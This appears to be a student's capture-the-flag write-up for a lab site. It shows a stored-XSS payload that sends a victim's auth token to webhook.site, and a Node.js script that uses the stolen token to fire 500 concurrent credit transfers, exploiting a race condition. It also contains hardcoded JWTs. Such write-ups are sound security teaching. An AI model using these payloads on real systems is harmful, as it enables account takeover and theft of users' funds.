1. For the first task, I investigated firstly DevTools and cheked what keys are in my object using `Object.keys(localStorage)` and found out that I can use "auth_token" item as my token.
After that I displayed my token using `localStorage.getItem("auth_token")`. We will need it later for the second task. But for now, to get a message from Mr. Short, I used https://www.webhook.site.
I generated a new ID and posted a publicly available message on secleak.secenv: `<img src=x onerror="new Image().src='https://webhook.site/WEBHOOK-ID?token=' + localStorage.getItem('auth_token')">`.
(WEBHOOK-ID is an ID from webhook site). After some seconds, I got a respond from Mr. Short and could reveal his token.

2. For the second task, I wrote a Javascript code to send credits concurrently from one user to another. Since we could find out Mr. Short's token from the first task, we could use it
to enter into his account and I found out that he has 10 credits. So with the Javascript code I send this 10 credits into my own user account. Since I used concurrency in my code and race
conditions, it allowed me to send double or sometimes even 3 times more credits than Mr. Short possess. So I was sending everytime from Mr. Short to my account and then from mine to
Mr. Shorts until I haven't reached enough credits to subscribe into The Hive's account (in this case 10000 credits) and read his private message.

```
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
const axios = require('axios');
const url = 'http://secleak.secenv/api/credit';

const headers = {
    'Content-Type': 'application/json',
	
	// Mr. Short's token
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDc0ODk2MjgsIm5iZiI6MTc0NzQ4OTYyOCwianRpIjoiZjBjMDJmZWMtZTE5ZC00Yjk3LWEwZTktYTg2NTFiM2E0MmM1IiwiaWRlbnRpdHkiOnsidWlkIjo0MzksIm5pY2siOiJNci4gU2hvcnQifSwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.M-DT0gHNm66-B4eYNjW3G42vrPId7rStTUJm5BWA1hA'
    
	
	// My personal token
	// 'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDczMzY5NzAsIm5iZiI6MTc0NzMzNjk3MCwianRpIjoiYmUzYzA1N2QtNzEyNi00NmMyLWFhOWUtMjhkMDcyYWYxMGY2IiwiaWRlbnRpdHkiOnsidWlkIjo0MzksIm5pY2siOiJCbGF6ZSBQcm93bGVyIiwiY2hhbGxlbmdlIjoic2VjbGVhayJ9LCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.Ska4PsrcIbW0FYukNv9Fw4IYULE_owWT_mFLKdFb2fc'
};

const body = {
    amount: "4320",
    receiver: "Blaze Prowler"
    // receiver: "Mr. Short"
	
};

(async () => {
    const results = await Promise.allSettled(
        Array.from({ length: 500 }, () =>
            axios.post(url, body, { headers }).catch(e => e)
        )
    );

    const success = results.filter(r => r.status === 'fulfilled').length;
    const failed = results.length - success;

    console.log(`Successful transfers: ${success}`);
    console.log(`Failed transfers: ${failed}`);
})();
```